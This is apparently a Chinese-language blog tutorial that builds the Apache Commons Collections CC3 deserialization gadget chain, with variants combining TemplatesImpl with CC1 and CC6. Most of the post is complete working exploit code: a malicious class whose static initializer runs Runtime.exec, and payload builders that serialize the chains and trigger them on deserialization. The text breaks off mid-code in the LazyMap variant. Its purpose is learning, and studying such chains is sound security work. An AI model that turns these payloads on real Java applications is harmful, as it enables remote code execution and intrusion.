<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchFieldException, TransformerConfigurationException &#123;</span><br><span class="line">      <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">      <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">      setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">      setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line">      setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">      templates.newTransformer();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接写一个方法调用反射</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName,Object fieldValue)</span> <span class="keyword">throws</span> IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">      <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">      field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      field.set(object,fieldValue);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这个时候运行起来，遇到了报错，出现在newTransformer()那里，也是TemplatesImpl这个类里面的422行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250219132906.png" ></p>
<hr>
<h5 id="解决报错"><a href="#解决报错" class="headerlink" title="解决报错"></a>解决报错</h5><p>进入到代码，在前面一个地方打个断点</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250219133216.png" ></p>
<p>前面defineClass()其实已经加载好了，来到后面有一个判断</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250219133455.png" ></p>
<p>判断在前面<code>defineClass()</code>方法中传进去的参数b数组的字节码是否继承了<code>ABSTRACT_TRANSLET</code>这个父类，如果没有，则给<code>_auxClasse</code>赋值put，此时在调试台中看变量可以发现这个<code>_auxClasse</code>是null，还没被初始化，所以put会失败</p>
<p>目前看起来有两种解决方法：</p>
<ul>
<li>让父类继承<code>ABSTRACT_TRANSLET</code></li>
<li>让<code>_auxClasse</code>不是null</li>
</ul>
<p>但是要关注到后面的代码还有一个判断</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250219135451.png" ></p>
<p>如果 _transletIndex &lt; 0 会抛出异常 而如果不进if语句里(不满足父类 equals ABSTRACT_TRANSLET) _transletIndex就是 -1,也不得行,还会报错</p>
<p>所以我们的解决方案还是让父类继承<code>ABSTRACT_TRANSLET</code></p>
<p>现在把恶意类改成</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再重新建构，执行前面的代码，这样就能正常弹计算机了</p>
<h4 id="结合TemplatesImpl的CC1和CC6"><a href="#结合TemplatesImpl的CC1和CC6" class="headerlink" title="结合TemplatesImpl的CC1和CC6"></a>结合TemplatesImpl的CC1和CC6</h4><h5 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h5><p>回顾一下之前的CC1，最后是用<code>transform()</code>触发，现在尝试直接调用看看可不可行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchFieldException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer(); </span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 把上面这句换成下面的一段</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(<span class="literal">null</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName,Object fieldValue)</span> <span class="keyword">throws</span> IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,fieldValue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前面已经把我们要传的参数templates用<code>new ConstantTransformer(templates)</code>定义了，后面直接用transform的时候随便传参就好了</p>
<p>接下来引入反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchFieldException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(null);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;Flow&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformerMap = TransformedMap.decorate(hashMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformerMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName,Object fieldValue)</span> <span class="keyword">throws</span> IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,fieldValue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就能执行成功</p>
<h5 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h5><p>原理和上面差不多，直接贴出代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchFieldException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(null);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 有一个decorateMap是LazyMap修饰过的</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再套一层TiedMapEntry</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorateMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        decorateMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射修改factory的值</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(decorateMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName,Object fieldValue)</span> <span class="keyword">throws</span> IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,fieldValue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CC3本身"><a href="#CC3本身" class="headerlink" title="CC3本身"></a>CC3本身</h4><p>我们是通过<code>TemplatesImpl.newTransformer()</code>加载恶意类，查找用法看看哪里有用到newTransformer()，一共有四个地方，最后选择了<code>TrAXFilter</code>这个类，因为：</p>
<ul>
<li>有一个在Process里面的main，调用不了</li>
<li>有两个在<code>TransformerFactoryImpl</code>，但是这个类不能反序列化，如果还要传参数的话就要看他构造函数有没有操作空间，结果这个类的构造函数没有什么，很难传</li>
</ul>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250219153605.png" ></p>
<ul>
<li>最后找到<code>TrAXFilter</code>，这个也不能序列化，不过他的构造函数内容多多了</li>
</ul>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250219153733.png" ></p>
<p>而且里面直接调用了<code>(TransformerImpl) templates.newTransformer()</code>,非常适合，直接接上前面的内容就可以实现恶意代码执行</p>
<p>这次CC3链子没有用到<code>InstantiateTransformer</code>，而是<code>InstantiateTransformer</code></p>
<p>他的构造函数参数够多，而且看到他的transform()，完全符合我们的需求</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-02-19%2015.40.08.png" ></p>
<h5 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h5><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250219161030.png" ></p>
<p>对于<code>InstantiateTransformer</code>的构造函数，我们就这么写，对应上<code>TrAXFilter</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)</span><br></pre></td></tr></table></figure>

<p>先直接调用transform()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure>

<p>这样可以执行，现在套上cc1的内容，为了顺利执行传入<code>TrAXFilter.class</code>这个参数，还是要用到<code>ChainedTransformer</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchFieldException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;flow&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样是能成功执行的，按这个套路套入LazyMap版本的和CC6，都成功了</p>
<p><strong>LazyMap</strong>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchFieldException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = 